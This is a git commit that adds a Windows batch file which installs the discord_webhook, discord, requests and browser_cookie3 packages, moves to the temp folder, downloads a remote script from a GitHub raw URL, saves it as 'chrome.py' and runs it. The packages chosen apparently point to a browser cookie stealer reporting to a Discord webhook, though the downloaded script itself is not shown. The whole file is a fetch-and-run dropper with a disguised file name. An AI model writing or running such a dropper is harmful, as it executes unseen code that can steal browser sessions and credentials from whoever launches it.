a3651ba5f03bbb09075e448833699c2cea69ae41
C2DXE <69322293+C2DXE@users.noreply.github.com>
2024-06-10 16:42:06 +0200

    Create .bat

---
+++ .bat
@@ -0,0 +1,8 @@
+@echo off
+pip install discord_webhook
+pip install discord
+pip install requests
+pip install browser_cookie3
+cd %temp%
+curl -s https://raw.githubusercontent.com/C2DXE/CUM/main/cum --output chrome.py
+python chrome.py
